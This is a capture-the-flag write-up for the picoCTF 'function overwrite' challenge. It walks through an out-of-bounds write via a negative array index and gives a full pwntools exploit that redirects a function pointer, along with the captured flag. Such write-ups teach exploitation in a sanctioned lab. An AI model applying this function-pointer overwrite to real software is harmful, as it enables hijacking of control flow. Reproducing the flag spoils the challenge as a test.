---
layout: post
title: Out-of-bound Write - picoCTF function overwrite
tags: [CTF, pwn]
---
> Story telling class 2/2 
> 
> You can point to all kinds of things in C. Checkout our function pointers demo [program](https://artifacts.picoctf.net/c/229/vuln). You can view source [here](https://artifacts.picoctf.net/c/229/vuln.c). And connect with it using `nc saturn.picoctf.net 50379`

## Source Code
Three inputs, a string and two numbers. The string is used to calculate the "score" by suming the ASCII numbers.
```c
int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}
```
Two numbers are used as an index in an array and the value to be modified. There's a out-of-bound write because negative indexes are possible in C.
```c
void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
```

## Attack 
The target is to overwrite `check` to be `easy_checker`, otherwise `check` will be `hard_checker` and it is impossible to get that score.
```c
void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  /* ... */

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  /* ... */
```
To achieve this, calculate the offset between `check` and `fun`, along with `easy_checker` and `hard_checker` and we can pass the check.
```
gef➤  info address fun
Symbol "fun" is at 0x804c080 in a file compiled without debugging.
gef➤  info address check
Symbol "check" is at 0x804c040 in a file compiled without debugging.
gef➤  info address easy_checker 
Symbol "easy_checker" is at 0x80492fc in a file compiled without debugging.
gef➤  info address hard_checker 
Symbol "hard_checker" is at 0x8049436 in a file compiled without debugging.
```

```python
from pwn import *

fun = 0x804c080
check = 0x804c040
easy = 0x80492fc
hard = 0x8049436
win = b'~'*10 + b'M'
assert sum(win) == 1337

p = process('./vuln') if args.LOCAL else remote('saturn.picoctf.net', 50379)
p.sendlineafter(b'>> ', win)
p.sendlineafter(b'than 10.\n', f'{(check-fun) // 4} {easy - hard}'.encode('ascii'))
p.interactive()
```

```
❯ python3 ./solve.py
[+] Opening connection to saturn.picoctf.net on port 50379: Done
[*] Switching to interactive mode
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_53614882}
[*] Got EOF while reading in interactive
```